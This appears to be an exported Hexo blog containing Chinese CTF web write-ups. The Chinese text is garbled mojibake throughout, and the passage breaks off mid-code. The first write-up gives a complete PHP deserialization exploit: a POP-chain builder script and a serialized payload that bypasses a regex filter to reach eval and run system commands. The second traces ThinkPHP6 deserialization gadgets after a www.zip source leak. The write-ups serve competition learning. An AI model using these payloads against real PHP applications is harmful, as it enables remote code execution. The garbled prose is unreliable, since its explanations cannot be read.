<p>æƒ³å½“ç„¶åœ°æˆ‘ä»¬æƒ³è°ƒç”¨<code>EvilClass.php</code>é‡Œé¢çš„ç±»ï¼Œæ‰€ä»¥è¦<code>include EvilClass.php</code>ï¼Œä½†æ˜¯æ–‡ä»¶é‡Œè¿˜æ˜¯æ²¡æœ‰å®šä¹‰<code>EvilClass</code>ï¼Œè¿™é‡Œå°±æ¶‰åŠåˆ°ä¸€ä¸ª[phpååºåˆ—çš„å†·çŸ¥è¯†](<a href="https://zhuanlan.zhihu.com/p/405838002">PHPåºåˆ—åŒ–å†·çŸ¥è¯† - çŸ¥ä¹ (zhihu.com)</a>)</p>
<p>æˆ‘ä»¬è¿˜å‘ç°ä¹‹åçš„ifåˆ¤æ–­è¯­å¥ä¸­banæ‰äº†<code>Evil</code>ï¼Œè¿™å°±è¯´æ˜åœ¨åºåˆ—åŒ–ä¹‹åçš„å­—ç¬¦ä¸²ä¸­ä¸èƒ½å†å‡ºç°<code>EvilClass</code>ï¼Œä¸è¿‡å¯ä»¥ç›´æ¥æ‹¿é‡Œé¢çš„payload</p>
<p>æ‰€ä»¥payload1ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:1:&#123;i:0;O:22:&quot;__PHP_Incomplete_Class&quot;:1:&#123;s:3:&quot;qwb&quot;;O:9:&quot;EvilClass&quot;:0:&#123;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>



<p><code>EvilClass.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$a</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$b</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$allowfunc</span> = [<span class="string">&quot;var_dump&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a-&gt;read();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;lock lock read!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        B::<span class="variable">$b</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b-&gt;learn();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        B::<span class="variable">$a</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b-&gt;see();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$t1</span>,<span class="variable">$t2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$s1</span> = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="variable">$s1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>0x02:</strong></p>
<p>ä¹‹åå°±æ˜¯å¼€å§‹åˆ©ç”¨<code>EvilClass.php</code>äº†</p>
<p>å‰é¢åˆ°Açš„popé“¾æ¯”è¾ƒç®€å•ï¼š</p>
<p>1.ä»<code>__destruct</code>å‡ºå‘ï¼Œåˆ©ç”¨dieè¿”å›å­—ç¬¦ä¸²è°ƒç”¨<code>__toString</code></p>
<p>2.ç„¶ååœ¨Cä¸­å®ä¾‹åŒ–Dï¼Œè°ƒç”¨readæ–¹æ³•</p>
<p>3.Dä¸­å®ä¾‹åŒ–Fï¼Œè°ƒç”¨<code>__call</code>é­”æœ¯æ–¹æ³•</p>
<p>4.Fä¸­å®ä¾‹åŒ–Eï¼Œè°ƒç”¨<code>__invoke</code>é­”æœ¯æ–¹æ³•ï¼Œå†å®ä¾‹åŒ–Aè¿›å»seeæ–¹æ³•</p>
<p>ä¹‹åçš„é‡ç‚¹å°±æ˜¯<code>see</code>äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">see</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="variable">$b</span> = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">       <span class="variable">$checker</span> = <span class="keyword">new</span> ReflectionClass(get_class(<span class="variable">$b</span>));</span><br><span class="line">       <span class="variable">$a</span> = basename(<span class="variable">$checker</span>-&gt;getFileName());</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$a</span> != <span class="string">&#x27;EvilClass.php&#x27;</span>&amp;&amp;B::<span class="variable">$a</span>&amp;&amp;B::<span class="variable">$b</span>)&#123;</span><br><span class="line">           <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$b</span>-&gt;a)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$b</span>-&gt;b))&#123;</span><br><span class="line">               <span class="variable">$func</span> = <span class="variable">$b</span>-&gt;a;</span><br><span class="line">               <span class="variable">$args</span> = <span class="variable">$b</span>-&gt;b;</span><br><span class="line">               <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\S+)\(&quot;([^)\\\\\&quot;\x00-\x19;,&#123;&#125;$]+)&quot;\)/m&#x27;</span>,<span class="string">&quot;<span class="subst">$func</span>(\&quot;<span class="subst">$args</span>\&quot;)&quot;</span>,<span class="variable">$match</span>))&#123;</span><br><span class="line">                   <span class="keyword">if</span>(!in_array(<span class="variable">$match</span>[<span class="number">1</span>],B::<span class="variable">$allowfunc</span>)&amp;&amp;function_exists(<span class="variable">$match</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">                       <span class="keyword">die</span>(<span class="string">&quot;not allow&quot;</span>);</span><br><span class="line">                   &#125;</span><br><span class="line">                   <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$match</span>[1](\&quot;<span class="subst">$match</span>[2]\&quot;);&quot;</span>);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><strong>0x03:</strong></p>
<p>è¿™é‡Œå¡äº†ä¸¤æ¬¡</p>
<p>1.ä»ç¬¬ä¸€ä¸ªifé‡Œé¢å¯ä»¥çŸ¥é“<code>$this-&gt;b</code>å®ä¾‹åŒ–çš„ç±»ä¸èƒ½æ˜¯<code>EvilClass.php</code>æ–‡ä»¶ä¸­å­˜åœ¨çš„ç±»ï¼Œæ‰€ä»¥ç°åœ¨åªèƒ½åˆ©ç”¨åŸç”Ÿç±»äº†ï¼Œåˆ©ç”¨è„šæœ¬æ‰¾åŸç”Ÿç±»çš„æ—¶å€™æ€»æ˜¯è¿‡ä¸å»ï¼Œè¦ä¹ˆè¯´æœªå®šä¹‰è¦ä¹ˆç›´æ¥<code>bad request</code>ï¼Œåæ¥å‡ºäº†hint &gt;&gt; <code>stdClass</code>ï¼Œè¿™æ ·ç¬¬ä¸€ä¸ªifå’Œç¬¬äºŒä¸ªifè¿‡äº†</p>
<p>2.ç¬¬ä¸‰ä¸ªifè¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œä¸€å¼€å§‹åˆè¯•äº†åŠå¤©ï¼Œæœ€åå¯ä»¥å‘ç°æˆ‘ä»¬æ„é€ çš„payloadçš„å½¢å¼å¯ä»¥æ˜¯ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$func=var_dump(&#x27;&#x27;);system  // å¦‚æœæƒ³åœ¨var_dumpé‡Œé¢æ‰§è¡Œå‘½ä»¤çš„è¯ï¼Œç›´æ¥ç”¨åå¼•å·å°±å¯ä»¥çš„ var_dump(`ls`);</span><br><span class="line">$args=ls</span><br></pre></td></tr></table></figure>

<p>(ä¹‹åç»™çš„é‚£ä¸ªå¹²è´§å¥½åƒæ²¡ç”¨è¿‡</p>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// class stdClass&#123;</span></span><br><span class="line"><span class="comment">//     pubLic function __construct()&#123;</span></span><br><span class="line"><span class="comment">//         $this-&gt;a = &#x27;var_dump(`ls`);system&#x27;;</span></span><br><span class="line"><span class="comment">//         $this-&gt;b = &#x27;ls /&#x27;;</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>  ;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="keyword">new</span> <span class="built_in">stdClass</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b-&gt;a = <span class="string">&#x27;var_dump(`ls`);system&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b-&gt;b = <span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">see</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// $b = $this-&gt;b; // new A</span></span><br><span class="line">        <span class="comment">// $checker = new ReflectionClass(get_class($b));</span></span><br><span class="line">        <span class="comment">// $a = basename($checker-&gt;getFileName());</span></span><br><span class="line">        <span class="comment">// if($a != &#x27;EvilClass.php&#x27;&amp;&amp;B::$a&amp;&amp;B::$b)&#123;</span></span><br><span class="line">        <span class="comment">//     if(isset($b-&gt;a)&amp;&amp;isset($b-&gt;b))&#123;</span></span><br><span class="line">        <span class="comment">//         $func = $b-&gt;a;</span></span><br><span class="line">        <span class="comment">//         $args = $b-&gt;b;</span></span><br><span class="line">        <span class="comment">//         if(preg_match(&#x27;/(\S+)\(&quot;([^)\\\\\&quot;\x00-\x19;,&#123;&#125;$]+)&quot;\)/m&#x27;,&quot;$func(\&quot;$args\&quot;)&quot;,$match))&#123;</span></span><br><span class="line">        <span class="comment">//             if(!in_array($match[1],B::$allowfunc)&amp;&amp;function_exists($match[1]))&#123;</span></span><br><span class="line">        <span class="comment">//                 die(&quot;not allow&quot;);</span></span><br><span class="line">        <span class="comment">//             &#125;</span></span><br><span class="line">        <span class="comment">//             eval(&quot;$match[1](\&quot;$match[2]\&quot;);&quot;);</span></span><br><span class="line">        <span class="comment">//         &#125;</span></span><br><span class="line">        <span class="comment">//     &#125;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$a</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$b</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$allowfunc</span> = [<span class="string">&quot;var_dump&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="keyword">new</span> D();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// $this-&gt;a-&gt;read();</span></span><br><span class="line">        <span class="comment">// return &quot;lock lock read!&quot;;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="keyword">new</span> F();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// B::$b = true;</span></span><br><span class="line">        <span class="comment">// $this-&gt;b-&gt;learn();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// B::$a = true;</span></span><br><span class="line">        <span class="comment">// $this-&gt;b-&gt;see();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// die($this-&gt;a);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="keyword">new</span> E(<span class="string">&#x27;&#x27;</span>,<span class="keyword">new</span> A());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$t1</span>,<span class="variable">$t2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// $s1 = $this-&gt;b;</span></span><br><span class="line">        <span class="comment">// $s1();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>[<span class="number">1</span>] = <span class="keyword">new</span> E(<span class="keyword">new</span> C(),<span class="string">&#x27;&#x27;</span>);;</span><br><span class="line">var_dump(serialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// a:1:&#123;i:1;O:1:&quot;E&quot;:2:&#123;s:1:&quot;a&quot;;O:1:&quot;C&quot;:2:&#123;s:1:&quot;a&quot;;O:1:&quot;D&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;O:1:&quot;F&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;O:1:&quot;E&quot;:2:&#123;s:1:&quot;a&quot;;s:0:&quot;&quot;;s:1:&quot;b&quot;;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;O:8:&quot;stdClass&quot;:2:&#123;s:1:&quot;a&quot;;s:21:&quot;var_dump(`ls`);system&quot;;s:1:&quot;b&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;&#125;s:1:&quot;b&quot;;N;&#125;s:1:&quot;b&quot;;s:0:&quot;&quot;;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>å°†ç»“æœå’Œpayload1åˆåœ¨ä¸€èµ·ï¼š<br>payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;i:0;O:22:&quot;__PHP_Incomplete_Class&quot;:1:&#123;s:3:&quot;qwb&quot;;O:9:&quot;EvilClass&quot;:0:&#123;&#125;&#125;i:1;O:1:&quot;E&quot;:2:&#123;s:1:&quot;a&quot;;O:1:&quot;C&quot;:2:&#123;s:1:&quot;a&quot;;O:1:&quot;D&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;O:1:&quot;F&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;O:1:&quot;E&quot;:2:&#123;s:1:&quot;a&quot;;s:0:&quot;&quot;;s:1:&quot;b&quot;;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;O:8:&quot;stdClass&quot;:2:&#123;s:1:&quot;a&quot;;s:21:&quot;var_dump(`ls`);system&quot;;s:1:&quot;b&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;&#125;s:1:&quot;b&quot;;N;&#125;s:1:&quot;b&quot;;s:0:&quot;&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>ä¹‹åå†åˆ©ç”¨readflagè¯»å–å°±å¥½äº†</p>
]]></content>
      <categories>
        <category>å‚åŠ çš„å„ç§æ¯”èµ›</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>n^3ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>ä»£ç å®¡è®¡</title>
    <url>/2022/03/09/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h2 id="å®‰æ´µæ¯-2019-iamthinking"><a href="#å®‰æ´µæ¯-2019-iamthinking" class="headerlink" title="[å®‰æ´µæ¯ 2019]iamthinking"></a>[å®‰æ´µæ¯ 2019]iamthinking</h2><ul>
<li>thinkphp6 åºåˆ—åŒ–ååºåˆ—åŒ–æ¼æ´</li>
</ul>
<p><code>/public</code><br>å‘ç°æœ‰<code>www.jpg</code>ï¼Œæ‰€ä»¥å°±è¯•ç€ä¼šä¸ä¼šæœ‰æºç æ³„éœ²ï¼Œç›´æ¥è®¿é—®<code>www.zip</code>å¾—åˆ°æºç </p>
<span id="more"></span>

<p><strong>0x01:</strong><br>åœ¨<code>app/controller/index.php</code>é‡Œé¢å‘ç°ååºåˆ—åŒ–å‡½æ•°ï¼Œé‚£ä¹ˆæœ‰å¯èƒ½å¯ä»¥åˆ©ç”¨<br><img src="https://img-blog.csdnimg.cn/31b03b3093fb467184b53bf71cd3ff9c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1ZXJtb24=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¹‹åå°±å¯ä»¥æ‰¾ä¸€ä¸‹é“¾å­ï¼Œå¯ä»¥ä»<code>__destruct</code>,<code>__tostring</code>,<code>__call</code>ç­‰é­”æœ¯æ–¹æ³•</p>
<p>è®°å½•ä¸€ä¸‹ï¼š</p>
<p>1.å…ˆè¯•ä¸€ä¸‹<code>__destruct</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Abstractcache.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">$this</span>-&gt;autosave) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Model.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;lazySave) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Store.php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ä¿å­˜sessionæ•°æ®</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;clearFlashData();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sessionId</span> = <span class="keyword">$this</span>-&gt;getId();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">            <span class="variable">$data</span> = <span class="keyword">$this</span>-&gt;serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler-&gt;write(<span class="variable">$sessionId</span>, <span class="variable">$data</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler-&gt;delete(<span class="variable">$sessionId</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;init = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>çœ‹äº†ä¸€åœˆä¹‹åï¼Œå› ä¸ºä¸æ˜¯å¾ˆæ‡‚<code>namespace</code>å’Œ<code>use</code>å…³é”®å­—çš„ç”¨æ³•ï¼Œæ‰€ä»¥å…ˆå»æŸ¥äº†ä¸€ä¸‹</p>
<p>2.å†å›æ¥çœ‹ï¼Œæ„Ÿè§‰<code>Abstractcache.php</code>ä¸å¯åˆ©ç”¨ï¼Œæ‰€ä»¥å°±å…ˆå»è§‚å¯Ÿä¸€ä¸‹<code>Model.php</code>å§ï¼Œå…ˆå»è·Ÿè¸ªä¸€ä¸‹saveå‡½æ•°</p>
<p><code>Model/save()</code>ï¼ŒisEmptyå‡½æ•°è¦æ±‚<code>$this-&gt;data</code>ä¸ä¸ºç©ºï¼Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span> = [], <span class="keyword">string</span> <span class="variable">$sequence</span> = <span class="literal">null</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// æ•°æ®å¯¹è±¡èµ‹å€¼</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;setAttrs(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isEmpty() || <span class="literal">false</span> === <span class="keyword">$this</span>-&gt;trigger(<span class="string">&#x27;BeforeWrite&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment"># è¦æ±‚$this-&gt;dataä¸ä¸ºç©ºï¼Œå¹¶ä¸” $this-&gt;withEventä¸ºtrue</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;exists ? <span class="keyword">$this</span>-&gt;updateData() : <span class="keyword">$this</span>-&gt;insertData(<span class="variable">$sequence</span>);</span><br><span class="line">    	<span class="comment"># è¿›å…¥ updateData æ‰€ä»¥$this-&gt;exitsä¸ºtrue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å†™å…¥å›è°ƒ</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;trigger(<span class="string">&#x27;AfterWrite&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// é‡æ–°è®°å½•åŸå§‹æ•°æ®</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;origin   = <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;set      = [];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;lazySave = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è·Ÿè¸ª<code>updateData</code>å‡½æ•°ï¼Œä¸€è¡Œä¸€è¡Œçœ‹è¿‡å»ï¼Œå¯ä»¥åœ¨<code>    $allowFields = $this-&gt;checkAllowFields();</code>è·³è½¬åˆ°<code>checkAllowFields</code>å‡½æ•°ä¹‹åå¯ä»¥å‘ç°å­˜åœ¨æˆ‘ä»¬å¯æ§çš„å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥åˆ©ç”¨<code>toString</code>æ–¹æ³•</p>
<p><img src="http://82.156.2.166/img/iamthinking/check.png"></p>
<p>è·Ÿè¸ª<code>ModelEvent/triggerå‡½æ•°</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$event</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;withEvent) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$call</span> = <span class="string">&#x27;on&#x27;</span> . Str::studly(<span class="variable">$event</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span 